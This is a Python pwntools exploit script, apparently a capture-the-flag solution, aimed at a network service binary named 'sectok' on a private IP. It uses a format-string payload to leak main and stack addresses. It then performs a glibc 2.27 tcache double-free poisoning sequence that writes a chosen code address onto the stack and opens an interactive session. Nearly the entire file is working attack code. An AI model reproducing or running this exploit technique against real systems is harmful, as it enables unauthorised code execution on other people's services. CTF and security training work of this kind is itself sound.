#!/usr/bin/env python3

import struct, sys, pwn

def discard(proc, user: int):
    proc.sendline(b"d\n" + str(user).encode())

def generate(proc, name: bytes):
    proc.sendline(b"g\n" + name)

ADDR_DIFF = 0x400dfa - 0x400f56
STACK_DIFF = 0x7fffffffb918 - 0x7fffffffb910

pwn.context.terminal = ["tmux", "split-window", "-h"]

# proc = pwn.process('./sectok', stdin=pwn.PTY, stdout=pwn.PTY)
proc = pwn.remote('10.21.232.3', 10101)
# proc = pwn.remote('192.168.191.61', 10101)

pwn.gdb.attach(proc, gdbscript='''
b *gentok+55
b *distok+117
b *main+410
set glibc 2.27
''', gdb_args=['-q', '-ex', 'init-pwndbg'])

proc.recvuntil(b'name? ')
proc.sendline(b'%11$p%10$p')

proc.recvuntil(b'Hi 0x')
inp = proc.recvuntil(b'0x')
main_addr = int(inp[:-2], 16)
inp = proc.recvuntil(b'!')
base_addr = int(inp[:-1], 16)

pwn.log.info(f"MAIN_ADDR = {hex(main_addr)}")
pwn.log.info(f"BASE_ADDR = {hex(base_addr)}")

# input("> ")

target_addr = main_addr + ADDR_DIFF

# Enter your stack address here
write_addr = base_addr + STACK_DIFF

pwn.log.info(f"Found {hex(target_addr)=} {hex(write_addr)=}")

for i in range(9):
    generate(proc, b"ABCD")

for i in range(7):
    discard(proc, i)

discard(proc, 7)
discard(proc, 8)
discard(proc, 7)

for i in range(7):
    generate(proc, b"ABCD")

generate(proc, struct.pack("<Q", write_addr))
generate(proc, b"ABCD")
generate(proc, b"ABCD")
generate(proc, struct.pack("<Q", target_addr))

proc.sendline(b'x')

proc.interactive()
